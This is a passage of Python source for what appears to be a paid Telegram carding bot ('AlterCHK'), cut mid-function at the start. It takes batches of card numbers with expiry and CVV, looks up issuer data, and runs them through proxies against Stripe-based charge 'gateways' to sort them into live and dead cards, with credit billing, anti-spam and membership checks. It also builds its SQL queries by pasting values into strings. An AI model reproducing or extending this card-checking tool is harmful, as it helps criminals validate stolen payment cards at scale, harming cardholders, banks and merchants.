    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDau import StripeAuth
        CheckRecive = await StripeAuth(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'

        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

async def get_stripeauth(session, cc, cvv, month, year):
    from CMDmasstr import GateMasstr
    cc = f'{cc}|{month}|{year}|{cvv}'
    ResponseMass = await GateMasstr(session, cc)
    return f"<b>CC ↯ [<code>{cc}</code>]\nStatus ↯ {ResponseMass[0]} | Time ↯ {ResponseMass[2][0:4]}s\nMessage ↯ {ResponseMass[1]}</b>"

async def get_stripeauth_2(session, cc, cvv, month, year):
    from CMDmascn import GateMasstr
    cc = f'{cc}|{month}|{year}|{cvv}'
    ResponseMass = await GateMasstr(session, cc)
    return f"<b>CC ↯ [<code>{cc}</code>]\nStatus ↯ {ResponseMass[0]} | Time ↯ {ResponseMass[2][0:4]}s\nMessage ↯ {ResponseMass[1]}</b>"

async def get_stripeauth_3(session, cc, cvv, month, year):
    from CMDmassop import GateMasstr
    cc = f'{cc}|{month}|{year}|{cvv}'
    ResponseMass = await GateMasstr(session, cc)
    return f"<b>CC ↯ [<code>{cc}</code>]\nStatus ↯ {ResponseMass[0]} | Time ↯ {ResponseMass[2][0:4]}s\nMessage ↯ {ResponseMass[1]}</b>"

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["masscn"])
async def CMDmasstr(message: types.Message):
    NameGateway = 'Gateway 🔥 Unknown [ CCN 1$ ]'
    TwoNameGateway = 'Unknown'
    ThreeGateway = 'Gateway 🔥 Unknown CCN [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('masscn')
    if WaitStatus[0] in ['OFFLINE ❌', 'OFFLINE1 ❌']:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter) as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))

    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if await VerifyBanned(str(message.from_user.id)) == 'Yes':
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text="<b>You are banned from this bot.</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    VerMessage = message.text
    if message.reply_to_message:
        VerMessage = message.reply_to_message.text
    if len(re.findall(r'\d', VerMessage)) >= 15:
        pass

    if not any(char.isdigit() for char in VerMessage):
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return

    result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    result = json.loads(json.dumps(result[0]))
    Credits = result['Creditos']
    if int(Credits) < 10:
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text="<b>Insufficient Credits.</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheckMASS(re.sub("[^\d\n]", " ", VerMessage))
    if len(CcVerify) > 10:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThis command only supports 10 ccs!\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    for cc in CcVerify:
        try:
            result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{cc[0:6]}'")
            result = json.loads(json.dumps(result[0]))
            type = result['type']
            level = result['level']
            brand = result['brand']
            bank = result['bank']
            country = result['country']
            emoji = result['Emoji']
        except IndexError:
            try:
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                # await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                # await asyncio.sleep(e.value)
                return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{cc}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                #await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                #await asyncio.sleep(e.value)
                return
        rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{cc[0:6]}'")
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if rbin:
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nBin ↯ <code>{cc[0:6]} ({emoji})</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                #await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                #await asyncio.sleep(e.value)
                return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    now = datetime.datetime.now()
    current_datetime = now.strftime("%Y-%m-%d %H:%M:%S")
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING MASS 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n↯ Start Time: <code>{current_datetime}</code>\n↯ Gateway: {TwoNameGateway} | ↯ CCS Detected: <code>{len(CcVerify)}</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        async def main(lista):
            import certifi
            import ssl
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            conn = aiohttp.TCPConnector(ssl=ssl_context)
            async with aiohttp.ClientSession(connector=conn) as session:
                    mylist = lista.split('\n')
                    tasks = []
                    for x in range(len(mylist)):
                        splitter = mylist[x].split('|')
                        ccnum    = splitter[0]
                        mes      = splitter[1]
                        ano      = splitter[2]
                        cvv      = splitter[3]
                        tasks.append(asyncio.ensure_future(get_stripeauth_2(session=session, cc=ccnum, month=mes, year=ano, cvv=cvv)))
                    original_pokemon = await asyncio.gather(*tasks)
                    return original_pokemon
        finalr = await main('\n'.join(CcVerify))
        finalr = ("\n- - - - - - - - - - - - - - - - - - - - -\n".join(finalr))
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            total_count = finalr.count("LIVE ✅") + finalr.count("DEAD ❌")
            result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
            Credits = result['Creditos']
            new_credits = int(Credits) - int(total_count)
            await ConnectDB.run_query(f"UPDATE pruebas SET Creditos='{new_credits}' WHERE ID='{message.from_user.id}'")
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n{finalr}</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["masstr"])
async def CMDmasstr(message: types.Message):
    NameGateway = 'Gateway 🔥 Stripe [ CCN 5$ ]'
    TwoNameGateway = 'Stripe'
    ThreeGateway = 'Gateway 🔥 Stripe CCN [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('masstr')
    if WaitStatus[0] in ['OFFLINE ❌', 'OFFLINE1 ❌']:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except (TimeoutError, exceptions.RetryAfter) as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if await VerifyBanned(str(message.from_user.id)) == 'Yes':
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text="<b>You are banned from this bot.</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    VerMessage = message.text
    if message.reply_to_message:
        VerMessage = message.reply_to_message.text
    if len(re.findall(r'\d', VerMessage)) >= 15:
        pass

    if not any(char.isdigit() for char in VerMessage):
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        
    result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    result = json.loads(json.dumps(result[0]))
    Credits = result['Creditos']
    if int(Credits) < 10:
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text="<b>Insufficient Credits.</b>",
                reply_to_message_id=message.message_id
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except (aiogram.utils.exceptions.MessageToEditNotFound, aiogram.utils.exceptions.BadRequest):
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheckMASS(re.sub("[^\d\n]", " ", VerMessage))
    if len(CcVerify) > 10:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThis command only supports 10 ccs!\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            return
        except aiogram.utils.exceptions.BadRequest:
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    for cc in CcVerify:
        try:
            result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{cc[0:6]}'")
            result = json.loads(json.dumps(result[0]))
            type = result['type']
            level = result['level']
            brand = result['brand']
            bank = result['bank']
            country = result['country']
            emoji = result['Emoji']
        except IndexError:
            try:
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                # await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                # await asyncio.sleep(e.value)
                return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{cc}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                #await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                #await asyncio.sleep(e.value)
                return
        rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{cc[0:6]}'")
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        if rbin:
            try :
                await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nBin ↯ <code>{cc[0:6]} ({emoji})</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.MessageToEditNotFound:
                #await asyncio.sleep(e.value)
                return
            except aiogram.utils.exceptions.BadRequest:
                #await asyncio.sleep(e.value)
                return
